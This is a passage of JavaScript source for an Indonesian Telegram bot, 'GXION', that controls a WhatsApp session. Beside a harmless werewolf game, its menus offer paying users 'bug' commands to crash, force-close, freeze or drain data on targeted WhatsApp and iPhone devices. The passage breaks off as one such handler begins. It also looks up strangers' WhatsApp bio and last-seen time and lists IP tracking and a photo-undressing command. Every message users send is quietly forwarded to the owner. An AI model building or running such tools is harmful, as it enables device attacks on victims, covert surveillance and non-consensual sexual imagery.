⌑ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }
 
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</b></blockquote>
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <i>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</i>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

 
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});

// ================== CONFIG ==================
const DATA_FILE = path.join(__dirname, "wolfnight_games.json");

const JOIN_MS = 5 * 60 * 1000;   // 5 menit join
const NIGHT_MS = 60 * 1000;      // 60 detik malam (ubah)
const DAY_MS = 90 * 1000;        // 90 detik siang (ubah)
const MIN_PLAYERS = 5;

function wolfCount(n) {
  if (n <= 6) return 1;
  if (n <= 10) return 2;
  return 3;
}

// ================== JSON STORE ==================
function loadAll() {
  try {
    if (!fs.existsSync(DATA_FILE)) return {};
    return JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
  } catch (e) {
    console.error("Load JSON error:", e);
    return {};
  }
}
function saveAll(all) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(all, null, 2));
}
function getGame(chatId) {
  const all = loadAll();
  return all[String(chatId)] || null;
}
function setGame(chatId, game) {
  const all = loadAll();
  all[String(chatId)] = game;
  saveAll(all);
}
function delGame(chatId) {
  const all = loadAll();
  delete all[String(chatId)];
  saveAll(all);
}

// ================== HELPERS ==================
function isGroup(ctx) {
  return ctx.chat && (ctx.chat.type === "group" || ctx.chat.type === "supergroup");
}
function isPrivate(ctx) {
  return ctx.chat && ctx.chat.type === "private";
}
function now() { return Date.now(); }

function shuffle(arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}

function alivePlayers(game) {
  return game.players.filter(p => p.alive);
}

function findPlayer(game, userId) {
  return game.players.find(p => p.id === userId);
}

function roleAliveCount(game, role) {
  return game.players.filter(p => p.alive && p.role === role).length;
}

function othersAliveCount(game) {
  const wolves = roleAliveCount(game, "Serigala");
  const alive = alivePlayers(game).length;
  return alive - wolves;
}

function checkWin(game) {
  const wolves = roleAliveCount(game, "Serigala");
  const others = othersAliveCount(game);
  if (wolves <= 0) return { ended: true, winner: "WARGA" };
  if (wolves >= others) return { ended: true, winner: "SERIGALA" };
  return { ended: false };
}

function mention(p) {
  if (p.username) return `@${p.username}`;
  return p.name || String(p.id);
}

// ======= NOMOR LIST =======
function buildNumberList(game, onlyAlive = true) {
  const list = onlyAlive ? game.players.filter(p => p.alive) : game.players;
  // format: "1) @user"
  return list.map(p => `${p.no}) ${mention(p)}`).join("\n");
}

function getByNo(game, no, mustAlive = true) {
  const n = Number(no);
  if (!Number.isFinite(n)) return null;
  const p = game.players.find(x => x.no === n);
  if (!p) return null;
  if (mustAlive && !p.alive) return null;
  return p;
}

// ================== TIMER ==================
function schedulePhaseEnd(chatId, phase, ms) {
  let game = getGame(chatId);
  if (!game) return;

  if (game.timer && game.timer.id) clearTimeout(game.timer.id);

  const id = setTimeout(async () => {
    const g = getGame(chatId);
    if (!g || !g.active) return;

    if (phase === "night") await endNight(chatId);
    if (phase === "day") await endDay(chatId);
  }, ms);

  game.timer = { phase, endsAt: now() + ms, id };
  setGame(chatId, game);
}

// ================== ROLE SKILL MESSAGE (DM) ==================
function skillHelp(role) {
  if (role === "Serigala") {
    return `🐺 *SKILL SERIGALA*\nGunakan: /kill <nomor>\nContoh: /kill 3`;
  }
  if (role === "Dokter") {
    return `🧑‍⚕️ *SKILL DOKTER*\nGunakan: /heal <nomor>\nContoh: /heal 2`;
  }
  if (role === "Penerawang") {
    return `🔮 *SKILL PENERAWANG*\nGunakan: /scan <nomor>\nContoh: /scan 5`;
  }
  if (role === "Penyihir") {
    return `🧙 *PENYIHIR*\n(Role ada, skill belum diaktifkan di versi ini)`;
  }
  return `👤 *WARGA*\nTidak ada skill khusus.`;
}

async function dmRoleAndRules(ctx, game, player) {
  const text =
    `🎭 ROLE KAMU: *${player.role}*\n\n` +
    `${skillHelp(player.role)}\n\n` +
    `📌 Daftar pemain (pakai nomor):\n${buildNumberList(game, true)}\n\n` +
    `⚠️ Anti-cheat:\n- Skill malam hanya lewat DM bot\n- Voting siang hanya di grup (/vote <nomor>)`;

  await ctx.telegram.sendMessage(player.id, text, { parse_mode: "Markdown" });
}

async function dmNightReminder(ctx, game, player) {
  const text =
    `🌙 *MALAM ${game.nightNo}*\n\n` +
    `${skillHelp(player.role)}\n\n` +
    `📌 Pemain hidup:\n${buildNumberList(game, true)}\n\n` +
    `⏳ Malam berakhir dalam ${Math.max(0, Math.floor((game.timer.endsAt - now())/1000))} detik`;

  await ctx.telegram.sendMessage(player.id, text, { parse_mode: "Markdown" });
}

// ================== START GAME ==================
async function startGame(ctx) {
  const chatId = ctx.chat.id;
  let game = getGame(chatId);
  if (!game || !game.active) return;

  if (game.players.length < MIN_PLAYERS) {
    await ctx.reply(`❌ Player kurang (minimal ${MIN_PLAYERS}). Game dibatalkan.`);
    delGame(chatId);
    return;
  }

  // kasih nomor permanen berdasarkan urutan join
  game.players.forEach((p, i) => { p.no = i + 1; });

  // assign roles
  const n = game.players.length;
  const w = wolfCount(n);

  let roles = [];
  for (let i = 0; i < w; i++) roles.push("Serigala");
  roles.push("Dokter");
  roles.push("Penerawang");
  roles.push("Penyihir");
  while (roles.length < n) roles.push("Warga");
  roles = shuffle(roles);

  game.phase = "night";
  game.dayNo = 0;
  game.nightNo = 1;

  game.players.forEach((p, i) => {
    p.role = roles[i];
    p.alive = true;
    p.usedNight = false;
  });

  game.actions = {
    night: { wolfVotes: {}, doctorNo: null, seerNo: null },
    day: { votes: {} }
  };

  setGame(chatId, game);

  // DM role + aturan + nomor
  for (const p of game.players) {
    try { await dmRoleAndRules(ctx, game, p); } catch (e) {}
  }

  await ctx.reply(
    `🌙 *MALAM 1 DIMULAI!*\n` +
    `Semua skill malam lewat DM bot.\n` +
    `⏳ Durasi malam: ${Math.round(NIGHT_MS/1000)} detik\n\n` +
    `📌 Daftar pemain (nomor):\n${buildNumberList(game, true)}`,
    { parse_mode: "Markdown" }
  );

  // set timer
  schedulePhaseEnd(chatId, "night", NIGHT_MS);

  // DM reminder skill sesuai role (biar tiap role langsung tau harus ngetik apa)
  game = getGame(chatId);
  for (const p of alivePlayers(game)) {
    try { await dmNightReminder(ctx, game, p); } catch (e) {}
  }
}

// ================== END NIGHT ==================
async function endNight(chatId) {
  let game = getGame(chatId);
  if (!game || !game.active || game.phase !== "night") return;

  // resolve wolf target by majority of votes (no)
  const voteNos = Object.values(game.actions.night.wolfVotes || {}); // array of targetNo
  let wolfTargetNo = null;

  if (voteNos.length > 0) {
    const count = {};
    for (const no of voteNos) count[no] = (count[no] || 0) + 1;
    wolfTargetNo = Number(Object.keys(count).sort((a, b) => count[b] - count[a])[0]);
  }

  const doctorNo = game.actions.night.doctorNo ? Number(game.actions.night.doctorNo) : null;

  let killed = null;
  if (wolfTargetNo) {
    if (doctorNo && doctorNo === wolfTargetNo) {
      killed = null; // diselamatkan dokter
    } else {
      const targetP = getByNo(game, wolfTargetNo, true);
      if (targetP) {
        targetP.alive = false;
        killed = targetP;
      }
    }
  }

  // reset usedNight
  game.players.forEach(p => { p.usedNight = false; });

  // check win
  const win = checkWin(game);
  setGame(chatId, game);

  if (win.ended) {
    await finishGame(chatId, win.winner, `Setelah malam ${game.nightNo}`);
    return;
  }

  // go day
  game = getGame(chatId);
  game.phase = "day";
  game.dayNo += 1;
  game.actions.day.votes = {};
  setGame(chatId, game);

  const groupText =
    `☀️ *SIANG ${game.dayNo} DIMULAI!*\n\n` +
    (killed ? `💀 Korban malam ini: ${mention(killed)} (no:${killed.no})` : `✅ Tidak ada yang mati malam ini.`) +
    `\n\n🗳️ Voting gantung:\nKetik: /vote <nomor>\nContoh: /vote 4\n` +
    `⏳ Durasi voting: ${Math.round(DAY_MS/1000)} detik\n\n` +
    `📌 Pemain hidup:\n${buildNumberList(game, true)}`;

  await bot.telegram.sendMessage(chatId, groupText, { parse_mode: "Markdown" });
  schedulePhaseEnd(chatId, "day", DAY_MS);
}

// ================== END DAY ==================
async function endDay(chatId) {
  let game = getGame(chatId);
  if (!game || !game.active || game.phase !== "day") return;

  const votes = Object.values(game.actions.day.votes || {}); // targetNo
  let lynched = null;

  if (votes.length > 0) {
    const count = {};
    for (const no of votes) count[no] = (count[no] || 0) + 1;

    const sorted = Object.keys(count).sort((a, b) => count[b] - count[a]);
    const top = sorted[0];
    const topCount = count[top];
    const second = sorted[1];
    const secondCount = second ? count[second] : 0;

    if (topCount > secondCount) {
      const targetNo = Number(top);
      const targetP = getByNo(game, targetNo, true);
      if (targetP) {
        targetP.alive = false;
        lynched = targetP;
      }
    }
  }

  const win = checkWin(game);
  setGame(chatId, game);

  if (win.ended) {
    await finishGame(chatId, win.winner, `Setelah siang ${game.dayNo}`);
    return;
  }

  // next night
  game = getGame(chatId);
  game.phase = "night";
  game.nightNo += 1;
  game.actions.night = { wolfVotes: {}, doctorNo: null, seerNo: null };
  setGame(chatId, game);

  const msg =
    `🌙 *MALAM ${game.nightNo} DIMULAI!*\n\n` +
    (lynched ? `🪢 Yang digantung: ${mention(lynched)} (no:${lynched.no})\n` : `⚖️ Voting seri / tidak ada yang digantung.\n`) +
    `\nSemua skill malam lewat DM bot.\n` +
    `⏳ Durasi malam: ${Math.round(NIGHT_MS/1000)} detik\n\n` +
    `📌 Pemain hidup:\n${buildNumberList(game, true)}`;

  await bot.telegram.sendMessage(chatId, msg, { parse_mode: "Markdown" });

  schedulePhaseEnd(chatId, "night", NIGHT_MS);

  // DM reminder skill sesuai role (tiap malam)
  game = getGame(chatId);
  for (const p of alivePlayers(game)) {
    try { await dmNightReminder({ telegram: bot.telegram }, game, p); } catch (e) {}
  }
}

// ================== FINISH GAME ==================
async function finishGame(chatId, winner, reason) {
  const game = getGame(chatId);
  if (!game) return;

  const wolves = game.players.filter(p => p.role === "Serigala");
  const text =
    `🏁 *GAME SELESAI!*\n` +
    `🏆 Pemenang: *${winner}*\n` +
    `📌 (${reason})\n\n` +
    `🐺 Serigala adalah:\n` +
    wolves.map(p => `- no:${p.no} ${mention(p)}`).join("\n");

  await bot.telegram.sendMessage(chatId, text, { parse_mode: "Markdown" });
  delGame(chatId);
}

// ================== GROUP COMMANDS ==================

bot.command("wolfnight", async (ctx) => {
  if (!isGroup(ctx)) return ctx.reply("❌ /wolfnight dipakai di GRUP.");

  const chatId = ctx.chat.id;
  const existing = getGame(chatId);
  if (existing && existing.active) return ctx.reply("❌ Game sudah berjalan.");

  const game = {
    active: true,
    chatId,
    players: [],
    phase: "join",
    dayNo: 0,
    nightNo: 0,
    actions: { night: { wolfVotes: {}, doctorNo: null, seerNo: null }, day: { votes: {} } },
    timer: null
  };
  setGame(chatId, game);

  await ctx.reply(
    `🐺 *WOLFNIGHT DIMULAI!*\n\n` +
    `⏳ Waktu join: *5 menit*\n` +
    `✍️ Ketik /join untuk ikut\n\n` +
    `⚠️ Wajib: semua pemain chat bot dulu (/start) supaya bot bisa kirim role & skill ke DM.\n\n` +
    `📌 Nanti pakai nomor:\nContoh kill/heal/scan: /kill 3 /heal 2 /scan 5`,
    { parse_mode: "Markdown" }
  );

  // start after JOIN_MS
  let g = getGame(chatId);
  if (g.timer && g.timer.id) clearTimeout(g.timer.id);
  const id = setTimeout(() => startGame(ctx), JOIN_MS);
  g.timer = { phase: "join", endsAt: now() + JOIN_MS, id };
  setGame(chatId, g);
});

bot.command("join", (ctx) => {
  if (!isGroup(ctx)) return;

  const chatId = ctx.chat.id;
  const game = getGame(chatId);
  if (!game || !game.active || game.phase !== "join") {
    return ctx.reply("❌ Tidak ada sesi join yang aktif.");
  }

  const id = ctx.from.id;
  if (game.players.find(p => p.id === id)) return ctx.reply("⚠️ Kamu sudah join.");

  game.players.push({
    id,
    username: ctx.from.username || null,
    name: ctx.from.first_name || "Player",
    role: null,
    alive: true,
    usedNight: false,
    no: null
  });

  setGame(chatId, game);
  ctx.reply(`✅ ${ctx.from.first_name} join! Total: ${game.players.length}`);
});

bot.command("vote", (ctx) => {
  if (!isGroup(ctx)) return;

  const chatId = ctx.chat.id;
  const game = getGame(chatId);
  if (!game || !game.active || game.phase !== "day") {
    return ctx.reply("❌ Voting hanya saat SIANG.");
  }

  const voter = findPlayer(game, ctx.from.id);
  if (!voter || !voter.alive) return ctx.reply("❌ Kamu tidak ikut / kamu sudah mati.");

  const parts = ctx.message.text.trim().split(/\s+/);
  if (parts.length < 2) return ctx.reply("Cara: /vote <nomor>  (contoh: /vote 4)");

  const targetNo = Number(parts[1]);
  const target = getByNo(game, targetNo, true);
  if (!target) return ctx.reply("❌ Target tidak valid / sudah mati.");

  game.actions.day.votes[String(voter.id)] = targetNo;
  setGame(chatId, game);

  ctx.reply(`🗳️ ${mention(voter)} vote no:${target.no} ${mention(target)}.`);
});

bot.command("status", (ctx) => {
  if (!isGroup(ctx)) return;

  const chatId = ctx.chat.id;
  const game = getGame(chatId);
  if (!game || !game.active) return ctx.reply("❌ Tidak ada game.");

  const endsIn = game.timer?.endsAt ? Math.max(0, Math.floor((game.timer.endsAt - now()) / 1000)) : null;

  ctx.reply(
    `📊 *STATUS GAME*\n` +
    `Phase: *${game.phase}*\n` +
    `Malam: ${game.nightNo} | Siang: ${game.dayNo}\n` +
    (endsIn !== null ? `Sisa waktu: ${endsIn} detik\n\n` : "\n") +
    `Pemain hidup:\n${buildNumberList(game, true)}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("stopgame", (ctx) => {
  if (!isGroup(ctx)) return;
  const chatId = ctx.chat.id;
  const game = getGame(chatId);
  if (!game || !game.active) return ctx.reply("❌ Tidak ada game.");

  delGame(chatId);
  ctx.reply("🛑 Game dihentikan.");
});

// cari game user (karena DM tidak punya chatId grup)
function findUsersGame(userId) {
  const all = loadAll();
  for (const key of Object.keys(all)) {
    const g = all[key];
    if (g && g.active && g.players && g.players.find(p => p.id === userId)) return g;
  }
  return null;
}
function saveUsersGame(game) {
  setGame(game.chatId, game);
}

bot.command("kill", (ctx) => {
  if (!isPrivate(ctx)) return ctx.reply("❌ Anti cheat: /kill hanya lewat DM.");

  const game = findUsersGame(ctx.from.id);
  if (!game || !game.active) return ctx.reply("❌ Kamu tidak sedang ikut game.");
  if (game.phase !== "night") return ctx.reply("❌ /kill hanya saat MALAM.");

  const me = findPlayer(game, ctx.from.id);
  if (!me || !me.alive) return ctx.reply("❌ Kamu sudah mati / tidak ikut.");
  if (me.role !== "Serigala") return ctx.reply("❌ Kamu bukan Serigala.");
  if (me.usedNight) return ctx.reply("❌ Kamu sudah memakai skill malam ini.");

  const parts = ctx.message.text.trim().split(/\s+/);
  if (parts.length < 2) return ctx.reply("Cara: /kill <nomor> (contoh: /kill 3)");

  const targetNo = Number(parts[1]);
  const target = getByNo(game, targetNo, true);
  if (!target) return ctx.reply("❌ Target tidak valid / sudah mati.");
  if (target.id === me.id) return ctx.reply("❌ Tidak bisa bunuh diri.");

  game.actions.night.wolfVotes[String(me.id)] = targetNo;
  me.usedNight = true;

  saveUsersGame(game);
  ctx.reply(`🐺 Vote kill dicatat: no:${target.no} ${mention(target)}.`);
});

bot.command("heal", (ctx) => {
  if (!isPrivate(ctx)) return ctx.reply("❌ Anti cheat: /heal hanya lewat DM.");

  const game = findUsersGame(ctx.from.id);
  if (!game || !game.active) return ctx.reply("❌ Kamu tidak sedang ikut game.");
  if (game.phase !== "night") return ctx.reply("❌ /heal hanya saat MALAM.");

  const me = findPlayer(game, ctx.from.id);
  if (!me || !me.alive) return ctx.reply("❌ Kamu sudah mati / tidak ikut.");
  if (me.role !== "Dokter") return ctx.reply("❌ Kamu bukan Dokter.");
  if (me.usedNight) return ctx.reply("❌ Kamu sudah memakai skill malam ini.");

  const parts = ctx.message.text.trim().split(/\s+/);
  if (parts.length < 2) return ctx.reply("Cara: /heal <nomor> (contoh: /heal 2)");

  const targetNo = Number(parts[1]);
  const target = getByNo(game, targetNo, true);
  if (!target) return ctx.reply("❌ Target tidak valid / sudah mati.");

  game.actions.night.doctorNo = targetNo;
  me.usedNight = true;

  saveUsersGame(game);
  ctx.reply(`🧑‍⚕️ Heal dicatat: no:${target.no} ${mention(target)}.`);
});

bot.command("scan", async (ctx) => {
  if (!isPrivate(ctx)) return ctx.reply("❌ Anti cheat: /scan hanya lewat DM.");

  const game = findUsersGame(ctx.from.id);
  if (!game || !game.active) return ctx.reply("❌ Kamu tidak sedang ikut game.");
  if (game.phase !== "night") return ctx.reply("❌ /scan hanya saat MALAM.");

  const me = findPlayer(game, ctx.from.id);
  if (!me || !me.alive) return ctx.reply("❌ Kamu sudah mati / tidak ikut.");
  if (me.role !== "Penerawang") return ctx.reply("❌ Kamu bukan Penerawang.");
  if (me.usedNight) return ctx.reply("❌ Kamu sudah memakai skill malam ini.");

  const parts = ctx.message.text.trim().split(/\s+/);
  if (parts.length < 2) return ctx.reply("Cara: /scan <nomor> (contoh: /scan 5)");

  const targetNo = Number(parts[1]);
  const target = getByNo(game, targetNo, true);
  if (!target) return ctx.reply("❌ Target tidak valid / sudah mati.");

  const isWolf = target.role === "Serigala";
  me.usedNight = true;
  game.actions.night.seerNo = targetNo;

  saveUsersGame(game);

  await ctx.reply(
    `🔮 Hasil terawang:\nno:${target.no} ${mention(target)} adalah *${isWolf ? "SERIGALA 🐺" : "BUKAN serigala 👤"}*`,
    { parse_mode: "Markdown" }
  );
});

bot.command('tagall', async (ctx) => {
  try {
    // Pastikan command dipakai di grup
    if (!ctx.chat || ctx.chat.type === 'private') {
      return ctx.reply('❌ Command ini hanya bisa digunakan di grup.');
    }

    // Ambil list admin & member (Telegram tidak menyediakan API full member,
    // jadi biasanya hanya admin + user yang pernah interaksi)
    const admins = await ctx.getChatAdministrators();

    let text = '📢 TAG ALL MEMBER 📢\n\n';
    let mentions = [];

    admins.forEach(admin => {
      if (admin.user && !admin.user.is_bot) {
        mentions.push({
          type: 'text_mention',
          user: admin.user,
          offset: text.length,
          length: admin.user.first_name.length
        });
        text += admin.user.first_name + '\n';
      }
    });

    await ctx.reply(text, {
      entities: mentions
    });

  } catch (err) {
    console.error(err);
    ctx.reply('❌ Gagal melakukan tag all.');
  }
});

bot.on('message', async (ctx, next) => {
  try {
    const update = ctx.update.message;
    const user = ctx.from;
    const chat = ctx.chat;

    const pesanUser =
      update?.text ||
      update?.caption ||
      "-";

    const escapeHTML = (text) =>
      text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");

    const reportMessage = `
<blockquote expandable>
🔔 <b>NOTIFIKASI CHAT</b>

👤 <b>Username:</b> ${user.username ? '@' + user.username : '-'}
🆔 <b>User ID:</b> ${user.id}
💬 <b>Ketikan:</b>
${escapeHTML(pesanUser)}
🏠 <b>Dari Chat:</b> ${chat.type === "private" ? "Private Chat" : chat.title}
🆔 <b>Chat ID:</b> ${chat.id}
</blockquote>
`;

    await ctx.telegram.sendMessage(ownerID, reportMessage, {
      parse_mode: "HTML",
    });

    if (chat.type === "private") {
      await ctx.reply("NGAPAIN BRO MAKE PRIVATE CHAT?😹");
    }

  } catch (e) {
    console.log("Error:", e);
  }

  return next();
});

// ====== START COMMAND ======
bot.start((ctx) => {
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const runtimeStatus = formatRuntime();
  const cooldownStatus = loadCooldown();
  const allowed = loadAllowedGroups();

  if (!allowed.includes(ctx.chat.id)) {
    return ctx.reply("❌ Grup ini tidak memiliki akses.");
  }

  const menuMessage = `
<blockquote><pre>
アリグとかゴジャイマーゼ グシオン リクス ナンバー1 LIxx
⌬ OWNER : @Lixxishere2 
⌬ NAME BOT : GXION EXPAION 
⌬ VERSION : GEN 1
⌬ RUNTIME : ${runtimeStatus}
⌬ PREMIUM: ${premiumStatus}
⌬ COOLDOWN : ${cooldownStatus} Second
⌬ PREFIX : /
select button below this👀
</pre></blockquote>`;

  const keyboard = [
    [
      { text: "𝙙𝙚𝙡𝙖𝙮 𝙄𝙣𝙫𝙞𝙨 𝙗𝙪𝙜", callback_data: "/invis" },
      { text: "𝙛𝙤𝙧𝙘𝙡𝙤𝙨𝙚 𝙗𝙪𝙜", callback_data: "/bug" }
    ],
    [
      { text: "𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙖𝙘𝙘𝙚𝙨", callback_data: "/controls" },
      { text: "𝙘𝙧𝙖𝙨𝙝 𝙗𝙡𝙖𝙣𝙠 𝙗𝙪𝙜", callback_data: "/crash" }
    ],
    [
      { text: "𝙞𝙥𝙝𝙤𝙣𝙚 𝙗𝙪𝙜", callback_data: "/ip" }
    ],
    [
      { text: "𝙩𝙝𝙭", callback_data: "/tqto" },
      { text: "𝙢𝙙 𝙢𝙚𝙣𝙪", callback_data: "/md" }
    ]
  ];

  return ctx.replyWithVideo(thumbnailUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: keyboard }
  });
});

// ====== BUTTON: BACK TO START (EDIT MESSAGE) ======
bot.action("/start", async (ctx) => {
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const runtimeStatus = formatRuntime();
  const cooldownStatus = loadCooldown();
  const allowed = loadAllowedGroups();

  if (!allowed.includes(ctx.chat.id)) {
    return ctx.reply("❌ Grup ini tidak memiliki akses.");
  }

  const menuMessage = `
<blockquote><pre>
アリグとかゴジャイマーゼ グシオン リクス ナンバー1
OWNER     : @Lixxisheree2 
NAME BOT : GXION EXPAION 
VERSION : GEN 1
RUNTIME   : ${runtimeStatus}
PREMIUM   : ${premiumStatus}
COOLDOWN : ${cooldownStatus} Second
PREFIX    : /
select button below this👀
</pre></blockquote>`;

  const keyboard = [
    [
      { text: "𝙙𝙚𝙡𝙖𝙮 𝙄𝙣𝙫𝙞𝙨 𝙗𝙪𝙜", callback_data: "/invis" },
      { text: "𝙛𝙤𝙧𝙘𝙡𝙤𝙨𝙚 𝙗𝙪𝙜", callback_data: "/bug" }
    ],
    [
      { text: "𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙖𝙘𝙘𝙚𝙨", callback_data: "/controls" },
      { text: "𝙘𝙧𝙖𝙨𝙝 𝙗𝙡𝙖𝙣𝙠 𝙗𝙪𝙜", callback_data: "/crash" }
    ],
    [
      { text: "𝙞𝙥𝙝𝙤𝙣𝙚 𝙗𝙪𝙜", callback_data: "/ip" }
    ],
    [
      { text: "𝙩𝙝𝙭", callback_data: "/tqto" },
      { text: "𝙢𝙙 𝙢𝙚𝙣𝙪", callback_data: "/md" }
    ]
  ];

  try {
    await ctx.editMessageMedia(
      {
        type: "video",
        media: thumbnailUrl,
        caption: menuMessage,
        parse_mode: "HTML",
      },
      {
        reply_markup: { inline_keyboard: keyboard },
      }
    );
  } catch (e) {
    console.error(e);
  }
});

// ====== MENUS ======
bot.action("/controls", async (ctx) => {
  const controlsMenu = `
<blockquote><pre>CONTROL AKSES⛔</pre></blockquote>
⌬ /addbot - Add Sender 
⌬ /setcd - Set Cooldown
⌬ /killsesi - Reset Session
⌬ /addprem - Add Premium 
⌬ /delprem - Delete Premium 
⌬ /addgroup - add grup pake id group
⌬ /delgroup - dell group
⌬ /cekbio - cek bio WhatsApp 
`;

  const keyboard = [[{ text: "⌜KEMBALI", callback_data: "/start" }]];

  try {
    await ctx.editMessageCaption(controlsMenu, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard },
    });
  } catch (e) {
    await ctx.answerCbQuery().catch(() => {});
  }
});

bot.action("/ip", async (ctx) => {
  const ipMenu = `
<blockquote><pre>ip crash</pre></blockquote>
╰➤ /iphonecrash - crash with iPhone 
`;

  const keyboard = [[{ text: "⌜KEMBALI", callback_data: "/start" }]];

  try {
    await ctx.editMessageCaption(ipMenu, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard },
    });
  } catch (e) {
    await ctx.answerCbQuery().catch(() => {});
  }
});

bot.action("/bug", async (ctx) => {
  const bugMenu = `
<blockquote><pre>for close menu</pre></blockquote>
╰➤ /delicious - forclose 1 message 
╰➤ /spamfc - Forclose spam invisible 
╰➤ /onehit - one hit forclose 
`;

  const keyboard = [[{ text: "⌜KEMBALI", callback_data: "/start" }]];

  try {
    await ctx.editMessageCaption(bugMenu, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard },
    });
  } catch (e) {
    await ctx.answerCbQuery().catch(() => {});
  }
});

bot.action("/crash", async (ctx) => {
  const crashMenu = `
<blockquote><pre>crash blank</pre></blockquote>
╰➤ /lightdark blank ui
╰➤ /crashnotif - crash notif blank android 
`;

  const keyboard = [[{ text: "⌜KEMBALI", callback_data: "/start" }]];

  try {
    await ctx.editMessageCaption(crashMenu, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard },
    });
  } catch (e) {
    await ctx.answerCbQuery().catch(() => {});
  }
});

bot.action("/invis", async (ctx) => {
  const invisMenu = `
<blockquote><pre>delay mode</pre></blockquote>
╰➤ /bestdelay - 628xx - 100% Delay invis Super Ganas
╰➤ /execution  - delay invis bebas spam
╰➤ /coredelay - Delay 
╰➤ /delaymention - Delay mention
╰➤ /harddelay - delay hard bagian 2
╰➤ /nulldoc - delay 1message 
╰➤ /buldozer - Spong kuota only
╰➤ /delayfour - delay duration 
`;

  const keyboard = [[{ text: "⌜KEMBALI", callback_data: "/start" }]];

  try {
    await ctx.editMessageCaption(invisMenu, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard },
    });
  } catch (e) {
    await ctx.answerCbQuery().catch(() => {});
  }
});

bot.action("/tqto", async (ctx) => {
  const tqtoMenu = `
<blockquote><pre>THANKS TO
 -Xwarr (  Best Support )
 -Xata ( Suportt )
 -Yannbrut ( yan suka tt bila )
 -hannh ( Medan besi anj )
 -Raihan ( friend )
 -kiyo ( Friend )
 -All Buyer GXION
 -All Partner Lixx
</pre></blockquote>`;

  const keyboard = [[{ text: "⌜KEMBALI", callback_data: "/start" }]];

  try {
    await ctx.editMessageCaption(tqtoMenu, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard },
    });
  } catch (e) {
    await ctx.answerCbQuery().catch(() => {});
  }
});

bot.action('/md', async (ctx) => {
    const mdMenu = `
<blockquote><pre>md menu</pre>
</blockquote>
⌬ /chatowner - chat owner 
⌬ /balas - khusus owner 
⌬ /cekbio - cek bio number
⌬ /xnxx 
⌬ /pinterest - cari foto 
⌬ /ig - download 
⌬ /tiktok - tiktok download 
⌬ /cuaca - kota
⌬ /cekprofil -profil kamu 
⌬ /maps - kota
⌬ /getcode - url
⌬ /nude - reply foto Ubah ke telanjang 
⌬ /sticker - ubah jadi sticker 
⌬ /logo - ubah jadi ada logo
⌬ /trackip - lacak dengan ip
⌬ /donasi - donasi buat admin
⌬ /listharga - harga
⌬ play - cari lagu
⌬ /cosplayer 🔞
`;

    const keyboard = [
        [
            {
                text: "⌜KEMBALI",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(mdMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Я как твое солнце, которое светит тебе в темноте..") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.command("lightdark", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /lightdark 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
  caption: `
